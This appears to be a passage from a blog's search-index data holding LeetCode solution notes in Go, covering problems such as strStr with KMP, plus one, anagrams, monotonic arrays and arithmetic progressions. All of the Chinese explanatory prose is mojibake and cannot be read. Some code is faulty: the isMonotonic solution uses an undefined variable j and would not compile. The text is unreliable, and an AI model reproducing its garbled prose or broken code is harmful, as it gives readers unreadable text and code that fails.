- 1 { return i } } } return -1 } æ—¶é—´å¤æ‚åº¦O(lenhâˆ—lenn)ï¼Œç©ºé—´å¤æ‚åº¦O(1)\næ–¹æ³•ä¸‰ï¼šKMP è¿™ä¸ªæ˜¯çœ‹å®˜æ–¹é¢˜è§£å­¦åˆ°çš„ï¼Œcodingæ€è·¯ä¸€çœ¼çœ‹è¿‡å»å·²ç»æ™•äº†ï¼Œè¿™æ˜¯æˆ‘ç›®å‰é‡åˆ°æœ€éš¾çš„ä¸€ä¸ªæ€è·¯äº†ï¼š\nKMP ç®—æ³•æ˜¯ä¸€ä¸ªå¿«é€ŸæŸ¥æ‰¾åŒ¹é…ä¸²çš„ç®—æ³•ï¼Œå®ƒçš„ä½œç”¨å…¶å®å°±æ˜¯æœ¬é¢˜é—®é¢˜ï¼šå¦‚ä½•å¿«é€Ÿåœ¨ã€ŒåŸå­—ç¬¦ä¸²ã€ä¸­æ‰¾åˆ°ã€ŒåŒ¹é…å­—ç¬¦ä¸²ã€ï¼Œæ”¾ä¸ªé“¾æ¥https://www.zhihu.com/question/21923021/answer/281346746\nfunc strStr(haystack string, needle string) int { lenh, lenn := len(haystack), len(needle) if lenn == 0 { return 0 } next := make([]int, lenn) next[0] = -1 for i, j:= 0, -1; i \u0026lt; lenn - 1; { if j == -1 || needle[i] == needle[j] { i++ j++ next[i] = j } else { j = next[j] } } for i, j := 0,0; i\u0026lt;lenh \u0026amp;\u0026amp; j\u0026lt;lenn; { if j == -1 || haystack[i] == needle[j] { i++ j++ } else { j = next[j] } if j == lenn { return i - j } } return -1 } æ—¶é—´å¤æ‚åº¦O(lenh+lenn)ï¼Œç©ºé—´å¤æ‚åº¦O(lenn)\n58.æœ€åä¸€ä¸ªå•è¯çš„é•¿åº¦ ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸² sï¼Œç”±è‹¥å¹²å•è¯ç»„æˆï¼Œå•è¯å‰åç”¨ä¸€äº›ç©ºæ ¼å­—ç¬¦éš”å¼€ã€‚è¿”å›å­—ç¬¦ä¸²ä¸­ æœ€åä¸€ä¸ª å•è¯çš„é•¿åº¦ã€‚\nå•è¯ æ˜¯æŒ‡ä»…ç”±å­—æ¯ç»„æˆã€ä¸åŒ…å«ä»»ä½•ç©ºæ ¼å­—ç¬¦çš„æœ€å¤§ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šs = \u0026#34;Hello World\u0026#34; è¾“å‡ºï¼š5 è§£é‡Šï¼šæœ€åä¸€ä¸ªå•è¯æ˜¯â€œWorldâ€ï¼Œé•¿åº¦ä¸º 5ã€‚ ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šs = \u0026#34; fly me to the moon \u0026#34; è¾“å‡ºï¼š4 è§£é‡Šï¼šæœ€åä¸€ä¸ªå•è¯æ˜¯â€œmoonâ€ï¼Œé•¿åº¦ä¸º 4ã€‚ ç¤ºä¾‹ 3ï¼š\nè¾“å…¥ï¼šs = \u0026#34;luffy is still joyboy\u0026#34; è¾“å‡ºï¼š6 è§£é‡Šï¼šæœ€åä¸€ä¸ªå•è¯æ˜¯é•¿åº¦ä¸º 6 çš„â€œjoyboyâ€ã€‚ æ–¹æ³•ä¸€ï¼šåå‘éå† å¯ä»¥ä»å­—ç¬¦ä¸²æœ€åä¸€ä¸ªå­—èŠ‚å¼€å§‹åˆ¤æ–­ï¼Œå…ˆéå†åˆ°ä¸ä¸ºç©ºçš„å­—èŠ‚ï¼Œå†å¼€å§‹éå†åˆ°ä¸ºç©ºçš„å­—èŠ‚ï¼Œä¸­é—´çš„å­—èŠ‚æ•°å°±æ˜¯é•¿åº¦ï¼š\nfunc lengthOfLastWord(s string) int { n, m := len(s) - 1, 0 for s[n] == \u0026#39; \u0026#39; { n-- } for n \u0026gt;= 0 \u0026amp;\u0026amp; s[n] != \u0026#39; \u0026#39; { n-- m++ } return m } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(1)\n66.åŠ ä¸€ ç»™å®šä¸€ä¸ªè¡¨ç¤º å¤§æ•´æ•° çš„æ•´æ•°æ•°ç»„ digitsï¼Œå…¶ä¸­ digits[i] æ˜¯æ•´æ•°çš„ç¬¬ i ä½æ•°å­—ã€‚è¿™äº›æ•°å­—æŒ‰ä»å·¦åˆ°å³ï¼Œä»æœ€é«˜ä½åˆ°æœ€ä½ä½æ’åˆ—ã€‚è¿™ä¸ªå¤§æ•´æ•°ä¸åŒ…å«ä»»ä½•å‰å¯¼ 0ã€‚\nå°†å¤§æ•´æ•°åŠ  1ï¼Œå¹¶è¿”å›ç»“æœçš„æ•°å­—æ•°ç»„ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šdigits = [1,2,3] è¾“å‡ºï¼š[1,2,4] è§£é‡Šï¼šè¾“å…¥æ•°ç»„è¡¨ç¤ºæ•°å­— 123ã€‚ åŠ  1 åå¾—åˆ° 123 + 1 = 124ã€‚ å› æ­¤ï¼Œç»“æœåº”è¯¥æ˜¯ [1,2,4]ã€‚ ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šdigits = [4,3,2,1] è¾“å‡ºï¼š[4,3,2,2] è§£é‡Šï¼šè¾“å…¥æ•°ç»„è¡¨ç¤ºæ•°å­— 4321ã€‚ åŠ  1 åå¾—åˆ° 4321 + 1 = 4322ã€‚ å› æ­¤ï¼Œç»“æœåº”è¯¥æ˜¯ [4,3,2,2]ã€‚ ç¤ºä¾‹ 3ï¼š\nè¾“å…¥ï¼šdigits = [9] è¾“å‡ºï¼š[1,0] è§£é‡Šï¼šè¾“å…¥æ•°ç»„è¡¨ç¤ºæ•°å­— 9ã€‚ åŠ  1 å¾—åˆ°äº† 9 + 1 = 10ã€‚ å› æ­¤ï¼Œç»“æœåº”è¯¥æ˜¯ [1,0]ã€‚ æ–¹æ³•ä¸€ï¼šéå†+åˆ¤æ–­ é‡ç‚¹åœ¨äºè€ƒè™‘è¿›ä½é—®é¢˜ï¼Œé‚£ä¹ˆå¯ä»¥è®¾è®¡ä¸€å¥—é€»è¾‘ï¼šä»æœ€åä¸€ä½å‘å‰åˆ¤æ–­æ˜¯å¦ä¸º9ï¼Œä¸ä¸º9å°±ç›´æ¥åŠ ä¸€ç„¶åreturnç»“æœï¼Œä¸º9å°±ç»§ç»­åˆ¤æ–­ä¸‹ä¸€ä½ï¼Œå¦‚æœå‡ä¸º9ï¼Œåˆ™makeä¸€ä¸ªç¬¬0ä½ä¸º1ï¼Œå…¶ä»–ä¸º0çš„çš„æ–°æ•°ç»„å³å¯ï¼š\nfunc plusOne(digits []int) []int { n := len(digits) for i := n-1; i \u0026gt;= 0; i-- { if digits[i] != 9{ digits[i]++ return digits } digits[i] = 0 } digits = make([]int, n+1) digits[0] = 1 return digits } 283.ç§»åŠ¨é›¶ ç»™å®šä¸€ä¸ªæ•°ç»„ numsï¼Œç¼–å†™ä¸€ä¸ªå‡½æ•°å°†æ‰€æœ‰ 0 ç§»åŠ¨åˆ°æ•°ç»„çš„æœ«å°¾ï¼ŒåŒæ—¶ä¿æŒéé›¶å…ƒç´ çš„ç›¸å¯¹é¡ºåºã€‚\nè¯·æ³¨æ„ ï¼Œå¿…é¡»åœ¨ä¸å¤åˆ¶æ•°ç»„çš„æƒ…å†µä¸‹åŸåœ°å¯¹æ•°ç»„è¿›è¡Œæ“ä½œã€‚\nç¤ºä¾‹ 1:\nè¾“å…¥: nums = [0,1,0,3,12] è¾“å‡º: [1,3,12,0,0] ç¤ºä¾‹ 2:\nè¾“å…¥: nums = [0] è¾“å‡º: [0] æ–¹æ³•ä¸€ï¼šå¿«æ…¢æŒ‡é’ˆ åŒæŒ‡é’ˆæ³•ï¼Œä½¿ç”¨å¿«æ…¢æŒ‡é’ˆï¼Œå‡ä»å·¦è¾¹å‡ºå‘ï¼Œå¿«æŒ‡é’ˆéå†å…ƒç´ ï¼Œå¦‚æœéé›¶ï¼Œå…ƒç´ ä¸æ…¢æŒ‡é’ˆä½ç½®äº¤æ¢ï¼Œæ…¢æŒ‡é’ˆå³ç§»ï¼Œä¸º0åˆ™è·³è¿‡ç»§ç»­éå†ï¼š\nfunc moveZeroes(nums []int) { fast, slow, n:= 0, 0, len(nums) for ;fast \u0026lt; n;fast++ { if nums[fast] != 0 { nums[slow], nums[fast] = nums[fast], nums[slow] slow++ } } } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(1)\n242.æœ‰æ•ˆå­—æ¯å¼‚ä½è¯ ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸² s å’Œ t ï¼Œç¼–å†™ä¸€ä¸ªå‡½æ•°æ¥åˆ¤æ–­ t æ˜¯å¦æ˜¯ s çš„\nç¤ºä¾‹ 1:\nè¾“å…¥: s = \u0026#34;anagram\u0026#34;, t = \u0026#34;nagaram\u0026#34; è¾“å‡º: true ç¤ºä¾‹ 2:\nè¾“å…¥: s = \u0026#34;rat\u0026#34;, t = \u0026#34;car\u0026#34; è¾“å‡º: false æ–¹æ³•ä¸€ï¼šå“ˆå¸Œè¡¨ é¦–å…ˆæƒ³åˆ°çš„æ˜¯å“ˆå¸Œè¡¨ï¼š\nfunc isAnagram(s string, t string) bool { count := make(map[byte]int) if len(s)!=len(t) { return false } for i:= 0; i \u0026lt; len(s); i++ { count[s[i]]++ } for j:= 0; j \u0026lt; len(t); j++ { if count[t[j]]==0 { return false } count[t[j]]-- } return true } 389.æ‰¾ä¸åŒ ç»™å®šä¸¤ä¸ªå­—ç¬¦ä¸² s å’Œ t ï¼Œå®ƒä»¬åªåŒ…å«å°å†™å­—æ¯ã€‚\nå­—ç¬¦ä¸² t ç”±å­—ç¬¦ä¸² s éšæœºé‡æ’ï¼Œç„¶ååœ¨éšæœºä½ç½®æ·»åŠ ä¸€ä¸ªå­—æ¯ã€‚\nè¯·æ‰¾å‡ºåœ¨ t ä¸­è¢«æ·»åŠ çš„å­—æ¯ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šs = \u0026#34;abcd\u0026#34;, t = \u0026#34;abcde\u0026#34; è¾“å‡ºï¼š\u0026#34;e\u0026#34; è§£é‡Šï¼š\u0026#39;e\u0026#39; æ˜¯é‚£ä¸ªè¢«æ·»åŠ çš„å­—æ¯ã€‚ ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šs = \u0026#34;\u0026#34;, t = \u0026#34;y\u0026#34; è¾“å‡ºï¼š\u0026#34;y\u0026#34; æ–¹æ³•ä¸€ï¼šå“ˆå¸Œè¡¨ è¿™é‡Œç¬¬ä¸€ä¸ªæƒ³åˆ°çš„æ˜¯ä½¿ç”¨å“ˆå¸Œè¡¨ï¼Œéå†så­˜å‚¨æ¯ä¸ªå­—æ¯å‡ºç°æ¬¡æ•°ï¼Œå†ä¾¿åˆ©tæŸ¥è¯¢å­—æ¯å‡ºç°æ¬¡æ•°ï¼Œåªè¦å­˜åœ¨åˆ™æ¬¡æ•°å‡ä¸€ï¼Œä¸º0åˆ™ä¸ºè¢«æ·»åŠ çš„å­—æ¯ï¼š\nfunc findTheDifference(s string, t string) byte { charCount := make(map[byte]int) for i := 0; i \u0026lt; len(s); i++ { charCount[s[i]]++ } for j := 0; j \u0026lt; len(t); j++ { if charCount[t[j]] == 0 { return t[j] } charCount[t[j]]-- } return 0 } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(1)\næ–¹æ³•äºŒï¼šasciiç è®¡ç®— è¿™ä¸ªæ–¹æ³•æ˜¯é—®AIé—®å‡ºæ¥çš„ï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡çœ‹è§è¿™ä¸ªè§£æ³•ï¼ŒæƒŠä¸ºå¤©äººå¥½å§ï¼Œæˆ‘æ€ä¹ˆå°±æ²¡æƒ³åˆ°ï¼ˆå…¶å®å› ä¸ºé¢˜ç›®è¯´å…¨å°å†™ï¼Œæ²¡è€ƒè™‘è¿™ä¸ªäº†ï¼Œè¿™ä¸ªæ–¹æ³•è¿åˆ†å¤§å°å†™çš„æƒ…å†µä¹Ÿèƒ½ç§’ï¼‰ï¼Œç›´æ¥è½¬asciiæ±‚å’Œï¼Œç„¶åè®¡ç®—å‰åå·®å€¼å³å¯ï¼š\nfunc findTheDifference(s string, t string) byte { ascii1, ascii2 := 0,0 for i:= 0; i \u0026lt; len(s); i++ { ascii1 += int(s[i]) } for j:= 0; j \u0026lt; len(t); j++ { ascii2 += int(t[j]) } res := ascii2 - ascii1 return byte(res) } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(1)\n459.é‡å¤çš„å­å­—ç¬¦ä¸² ç»™å®šä¸€ä¸ªéç©ºçš„å­—ç¬¦ä¸² s ï¼Œæ£€æŸ¥æ˜¯å¦å¯ä»¥é€šè¿‡ç”±å®ƒçš„ä¸€ä¸ªå­ä¸²é‡å¤å¤šæ¬¡æ„æˆã€‚\nç¤ºä¾‹ 1:\nè¾“å…¥: s = \u0026#34;abab\u0026#34; è¾“å‡º: true è§£é‡Š: å¯ç”±å­ä¸² \u0026#34;ab\u0026#34; é‡å¤ä¸¤æ¬¡æ„æˆã€‚ ç¤ºä¾‹ 2:\nè¾“å…¥: s = \u0026#34;aba\u0026#34; è¾“å‡º: false ç¤ºä¾‹ 3:\nè¾“å…¥: s = \u0026#34;abcabcabcabc\u0026#34; è¾“å‡º: true è§£é‡Š: å¯ç”±å­ä¸² \u0026#34;abc\u0026#34; é‡å¤å››æ¬¡æ„æˆã€‚ (æˆ–å­ä¸² \u0026#34;abcabc\u0026#34; é‡å¤ä¸¤æ¬¡æ„æˆã€‚) æˆ‘ä¸€å¼€å§‹æƒ³åˆ°çš„æ˜¯KMPä½†æ˜¯å¾ˆéš¾æƒ³ï¼Œç„¶åAIç»™å‡ºäº†ä¸€ä¸ªå¾ˆä¸é”™çš„æ€è·¯ï¼ŒæŠŠå­—ç¬¦ä¸²é‡å¤ä¸¤æ¬¡æ‹¼æ¥ï¼Œç„¶åå»æ‰é¦–å°¾å­—èŠ‚ï¼Œå†åœ¨è¿™ä¸ªå­—ç¬¦ä¸²ä¸­å¯»æ‰¾æ˜¯å¦æœ‰åŸå­—ç¬¦ä¸²Â·ï¼Œè‹¥å­˜åœ¨åˆ™å¯ä»¥é‡å¤æ„æˆï¼Œé‚£ä¹ˆä»£ç å®ç°å¾ˆç®€å•ï¼Œä¸€ä¸ªContainså’Œä¸€ä¸ªåˆ‡ç‰‡å°±èƒ½æå®šï¼š\nfunc repeatedSubstringPattern(s string) bool { return strings.Contains((s+s)[1:len(s+s)-1], s) } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(n)\n709.è½¬æ¢æˆå°å†™å­—æ¯ ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸² s ï¼Œå°†è¯¥å­—ç¬¦ä¸²ä¸­çš„å¤§å†™å­—æ¯è½¬æ¢æˆç›¸åŒçš„å°å†™å­—æ¯ï¼Œè¿”å›æ–°çš„å­—ç¬¦ä¸²ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šs = \u0026#34;Hello\u0026#34; è¾“å‡ºï¼š\u0026#34;hello\u0026#34; ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šs = \u0026#34;here\u0026#34; è¾“å‡ºï¼š\u0026#34;here\u0026#34; ç¤ºä¾‹ 3ï¼š\nè¾“å…¥ï¼šs = \u0026#34;LOVELY\u0026#34; è¾“å‡ºï¼š\u0026#34;lovely\u0026#34; æ–¹æ³•ä¸€ï¼šå†…ç½®æ–¹æ³• ç›´æ¥ç”¨golangçš„å†…ç½®å‡½æ•°å³å¯\nfunc toLowerCase(s string) string { return strings.ToLower(s) } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(n)\næ–¹æ³•äºŒï¼šASCIIç  é¦–å…ˆçŸ¥é“ï¼š\nå¤§å†™å­—æ¯ A - Z çš„ ASCII ç èŒƒå›´ä¸º [65,90] å°å†™å­—æ¯ a - z çš„ ASCII ç èŒƒå›´ä¸º [97,122] æ‰€ä»¥å¤§å†™å­—æ¯çš„asciiç åŠ 32å³ä¸ºå°å†™å­—æ¯\nfunc toLowerCase(s string) string { runes := []rune(s) for i ,ch := range runes { if ch \u0026lt;=\u0026#39;Z\u0026#39; \u0026amp;\u0026amp; ch \u0026gt;= \u0026#39;A\u0026#39; { runes[i] += 32 } } return string(runes) } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(n)\n896.å•è°ƒæ•°åˆ— å¦‚æœæ•°ç»„æ˜¯å•è°ƒé€’å¢æˆ–å•è°ƒé€’å‡çš„ï¼Œé‚£ä¹ˆå®ƒæ˜¯ å•è°ƒ çš„ã€‚\nå¦‚æœå¯¹äºæ‰€æœ‰ i \u0026lt;= jï¼Œnums[i] \u0026lt;= nums[j]ï¼Œé‚£ä¹ˆæ•°ç»„ nums æ˜¯å•è°ƒé€’å¢çš„ã€‚ å¦‚æœå¯¹äºæ‰€æœ‰ i \u0026lt;= jï¼Œnums[i] \u0026gt;= nums[j]ï¼Œé‚£ä¹ˆæ•°ç»„ nums æ˜¯å•è°ƒé€’å‡çš„ã€‚\nå½“ç»™å®šçš„æ•°ç»„ nums æ˜¯å•è°ƒæ•°ç»„æ—¶è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šnums = [1,2,2,3] è¾“å‡ºï¼štrue ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šnums = [6,5,4,4] è¾“å‡ºï¼štrue ç¤ºä¾‹ 3ï¼š\nè¾“å…¥ï¼šnums = [1,3,2] è¾“å‡ºï¼šfalse æ–¹æ³•ä¸€ï¼šå¸¸è§„éå† æŒ‰ç…§é¢˜ç›®æè¿°çš„æ–¹æ³•æ¥éå†åˆ¤æ–­å³å¯ï¼š\nfunc isMonotonic(nums []int) bool { n := len(nums) if n \u0026lt; 3{ return true } i := 0 if nums[i] \u0026lt;= nums[n-1] { for ; i+1 \u0026lt; n;i++ { if nums[i] \u0026gt; nums[j] { return false } } } if nums[i] \u0026gt; nums[n-1] { for ; i+1 \u0026lt; n;i++{ if nums[i] \u0026lt; nums[j] { return false } } } return true } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(1)\n1502.åˆ¤æ–­èƒ½å¦å½¢æˆç­‰å·®æ•°åˆ— ç»™ä½ ä¸€ä¸ªæ•°å­—æ•°ç»„ arr ã€‚\nå¦‚æœä¸€ä¸ªæ•°åˆ—ä¸­ï¼Œä»»æ„ç›¸é‚»ä¸¤é¡¹çš„å·®æ€»ç­‰äºåŒä¸€ä¸ªå¸¸æ•°ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°åˆ—å°±ç§°ä¸º ç­‰å·®æ•°åˆ— ã€‚\nå¦‚æœå¯ä»¥é‡æ–°æ’åˆ—æ•°ç»„å½¢æˆç­‰å·®æ•°åˆ—ï¼Œè¯·è¿”å› true ï¼›å¦åˆ™ï¼Œè¿”å› false ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šarr = [3,5,1] è¾“å‡ºï¼štrue è§£é‡Šï¼šå¯¹æ•°ç»„é‡æ–°æ’åºå¾—åˆ° [1,3,5] æˆ–è€… [5,3,1] ï¼Œä»»æ„ç›¸é‚»ä¸¤é¡¹çš„å·®åˆ†åˆ«ä¸º 2 æˆ– -2 ï¼Œå¯ä»¥å½¢æˆç­‰å·®æ•°åˆ—ã€‚ ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šarr = [1,2,4] è¾“å‡ºï¼šfalse è§£é‡Šï¼šæ— æ³•é€šè¿‡é‡æ–°æ’åºå¾—åˆ°ç­‰å·®æ•°åˆ—ã€‚ æ–¹æ³•ä¸€ï¼šæ’åº+å·®å€¼åˆ¤æ–­ æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æ’åºåç”¨å·®æ¥åˆ¤æ–­ï¼Œå¦å¤–å½“æ•°ç»„é•¿åº¦å°äº2æ—¶ä¸€å®šä¸ä¸ºç­‰å·®ï¼š\nfunc canMakeArithmeticProgression(arr []int) bool { if len(arr)\u0026lt;2{ return false } sort.Ints(arr) complement := arr[1] - arr[0] for i := 1; i\u0026lt;len(arr)-1; i++ { if arr[i] + complement != arr[i+1] { return false } } return true } æ—¶é—´å¤æ‚åº¦ O(nlog n)ï¼Œç©ºé—´å¤æ‚åº¦ O(1)\næ–¹æ³•äºŒï¼šç®—å·®å€¼+å“ˆå¸Œè¡¨ å¦‚æœè¿˜æƒ³è¦æ›´å¿«ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ä¸ªå¾ˆå¥½çš„æ€è·¯ï¼Œé¦–å…ˆéå†å¾—åˆ°æå€¼å’Œå­˜å‚¨å‡ºç°æ¬¡æ•°çš„å“ˆå¸Œè¡¨ï¼Œç„¶åé€šè¿‡è®¡ç®—å…¬å·®ï¼Œä¸ä¸ºæ•´æ•°å°±falseï¼Œæ¥ä¸‹æ¥é€šè¿‡æœ€å°å€¼å’Œå…¬å·®æ¥ç®—å…ƒç´ å¹¶è¿›å…¥å“ˆå¸Œè¡¨æŸ¥è¯¢ï¼ŒæŸ¥è¯¢ä¸åˆ°åˆ™falseï¼ˆç¼ºç‚¹æ˜¯ç©ºé—´å¤æ‚åº¦é«˜ï¼‰ï¼š\nfunc canMakeArithmeticProgression(arr []int) bool { n := len(arr) if n \u0026lt; 2 { return false } max, min := arr[0], arr[0] nums := make(map[int]int) for i:=0; i \u0026lt; n; i++ { if arr[i] \u0026gt; max { max = arr[i] } if arr[i] \u0026lt; min { min = arr[i] } nums[arr[i]]++ } if (max - min)%(n-1) != 0 { return false } step := (max - min)/(n-1) for i:=0; i \u0026lt; n-1; i++{ if nums[min] == 0 { return false } nums[min]-- min += step } return true } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(n)\n1768.äº¤æ›¿åˆå¹¶å­—ç¬¦ä¸² ç»™ä½ ä¸¤ä¸ªå­—ç¬¦ä¸² word1 å’Œ word2 ã€‚è¯·ä½ ä» word1 å¼€å§‹ï¼Œé€šè¿‡äº¤æ›¿æ·»åŠ å­—æ¯æ¥åˆå¹¶å­—ç¬¦ä¸²ã€‚å¦‚æœä¸€ä¸ªå­—ç¬¦ä¸²æ¯”å¦ä¸€ä¸ªå­—ç¬¦ä¸²é•¿ï¼Œå°±å°†å¤šå‡ºæ¥çš„å­—æ¯è¿½åŠ åˆ°åˆå¹¶åå­—ç¬¦ä¸²çš„æœ«å°¾ã€‚\nè¿”å› åˆå¹¶åçš„å­—ç¬¦ä¸² ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šword1 = \u0026#34;abc\u0026#34;, word2 = \u0026#34;pqr\u0026#34; è¾“å‡ºï¼š\u0026#34;apbqcr\u0026#34; è§£é‡Šï¼šå­—ç¬¦ä¸²åˆå¹¶æƒ…å†µå¦‚ä¸‹æ‰€ç¤ºï¼š word1ï¼š a b c word2ï¼š p q r åˆå¹¶åï¼š a p b q c r ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šword1 = \u0026#34;ab\u0026#34;, word2 = \u0026#34;pqrs\u0026#34; è¾“å‡ºï¼š\u0026#34;apbqrs\u0026#34; è§£é‡Šï¼šæ³¨æ„ï¼Œword2 æ¯” word1 é•¿ï¼Œ\u0026#34;rs\u0026#34; éœ€è¦è¿½åŠ åˆ°åˆå¹¶åå­—ç¬¦ä¸²çš„æœ«å°¾ã€‚ word1ï¼š a b word2ï¼š p q r s åˆå¹¶åï¼š a p b q r s ç¤ºä¾‹ 3ï¼š\nè¾“å…¥ï¼šword1 = \u0026#34;abcd\u0026#34;, word2 = \u0026#34;pq\u0026#34; è¾“å‡ºï¼š\u0026#34;apbqcd\u0026#34; è§£é‡Šï¼šæ³¨æ„ï¼Œword1 æ¯” word2 é•¿ï¼Œ\u0026#34;cd\u0026#34; éœ€è¦è¿½åŠ åˆ°åˆå¹¶åå­—ç¬¦ä¸²çš„æœ«å°¾ã€‚ word1ï¼š a b c d word2ï¼š p q åˆå¹¶åï¼š a p b q c d æ–¹æ³•ä¸€ï¼šforå¾ªç¯ ç›¸å½“ç®€å•çš„ä¸€ä¸ªé¢˜ç›®äº†ï¼Œé¦–å…ˆæƒ³åˆ°çš„å°±æ˜¯å¾ªç¯ï¼Œç„¶åç”¨æŒ‡é’ˆæŒ‡å®šå­—ç¬¦ä¸²çš„æ¯ä¸ªbyteè¿›è¡Œæ‹¼æ¥ï¼Œç„¶ååˆ¤æ–­æ¡ä»¶ä¸ºæŒ‡é’ˆä¸è¶…è¿‡å­—ç¬¦ä¸²é•¿åº¦ï¼š\nfunc mergeAlternately(word1 string, word2 string) string { s := 0 res := \u0026#34;\u0026#34; for s \u0026lt; len(word1) || s \u0026lt; len(word2) { if s \u0026lt; len(word1) { res += string(word1[s]) } if s \u0026lt; len(word2) { res += string(word2[s]) } s++ } return res } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(len(word1) + len(word2))\n1822.æ•°ç»„å…ƒç´ ç§¯çš„ç¬¦å· å·²çŸ¥å‡½æ•° signFunc(x) å°†ä¼šæ ¹æ® x çš„æ­£è´Ÿè¿”å›ç‰¹å®šå€¼ï¼š\nå¦‚æœ x æ˜¯æ­£æ•°ï¼Œè¿”å› 1 ã€‚ å¦‚æœ x æ˜¯è´Ÿæ•°ï¼Œè¿”å› -1 ã€‚ å¦‚æœ x æ˜¯ç­‰äº 0 ï¼Œè¿”å› 0 ã€‚ ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums ã€‚ä»¤ product ä¸ºæ•°ç»„ nums ä¸­æ‰€æœ‰å…ƒç´ å€¼çš„ä¹˜ç§¯ã€‚\nè¿”å› signFunc(product) ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šnums = [-1,-2,-3,-4,3,2,1] è¾“å‡ºï¼š1 è§£é‡Šï¼šæ•°ç»„ä¸­æ‰€æœ‰å€¼çš„ä¹˜ç§¯æ˜¯ 144 ï¼Œä¸” signFunc(144) = 1 ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šnums = [1,5,0,2,-3] è¾“å‡ºï¼š0 è§£é‡Šï¼šæ•°ç»„ä¸­æ‰€æœ‰å€¼çš„ä¹˜ç§¯æ˜¯ 0 ï¼Œä¸” signFunc(0) = 0 ç¤ºä¾‹ 3ï¼š\nè¾“å…¥ï¼šnums = [-1,1,-1,1,-1] è¾“å‡ºï¼š-1 è§£é‡Šï¼šæ•°ç»„ä¸­æ‰€æœ‰å€¼çš„ä¹˜ç§¯æ˜¯ -1 ï¼Œä¸” signFunc(-1) = -1 ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆåŸºç¡€çš„é€»è¾‘åˆ¤æ–­ï¼šæ•°ç»„ä¸­æœ‰0å°±è¿”å›0ï¼Œç„¶åçœ‹è´Ÿæ•°çš„æ•°é‡ï¼Œä¸ºå¥‡æ•°åˆ™è¿”å›-1ï¼Œå¦åˆ™è¿”å›1:\nfunc arraySign(nums []int) int { count := 0 for i:= 0; i \u0026lt; len(nums); i++ { if nums[i] == 0 { return 0 } if nums[i] \u0026lt; 0 { count++ } } if count%2 == 0 { return 1 } return -1 } æ—¶é—´å¤æ‚åº¦O(n)ï¼Œç©ºé—´å¤æ‚åº¦O(1)\n",
        "summary": "åŠ›æ‰£leetcodeåˆ·é¢˜è®°å½• åœ¨ä¸€ä¸ªä¸Šç­æ‘¸é±¼çš„ä¸‹åˆï¼ŒæŠ±ç€ç»ƒç»ƒç®—æ³•å’Œgoè¯­è¨€åŸºç¡€çš„æƒ³æ³•æ‰“å¼€äº†åŠ›æ‰£ï¼Œå¹¶ä¸”å†³å®šåšæŒæ¯å¤©ä¸€é¢˜ï¼Œäºæ˜¯æœ‰äº†è¿™ç¯‡ç¬”è®°\n1.ä¸¤æ•°ä¹‹å’Œ ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªæ•´æ•°ç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡º å’Œä¸ºç›®æ ‡å€¼ target çš„é‚£ ä¸¤ä¸ª æ•´æ•°ï¼Œå¹¶è¿”å›å®ƒä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚\nä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆï¼Œå¹¶ä¸”ä½ ä¸èƒ½ä½¿ç”¨ä¸¤æ¬¡ç›¸åŒçš„å…ƒç´ ã€‚\nä½ å¯ä»¥æŒ‰ä»»æ„é¡ºåºè¿”å›ç­”æ¡ˆã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šnums = [2,7,11,15], target = 9 è¾“å‡ºï¼š[0,1] è§£é‡Šï¼šå› ä¸º nums[0] + nums[1] == 9 ï¼Œè¿”å› [0, 1] ã€‚ ç¤ºä¾‹ 2ï¼š\nè¾“å…¥ï¼šnums = [3,2,4], target = 6 è¾“å‡ºï¼š[1,2] ç¤ºä¾‹ 3ï¼š\nè¾“å…¥ï¼šnums = [3,3], target = 6 è¾“å‡ºï¼š[0,1] æ–¹æ³•ä¸€ï¼šå“ˆå¸Œè¡¨ 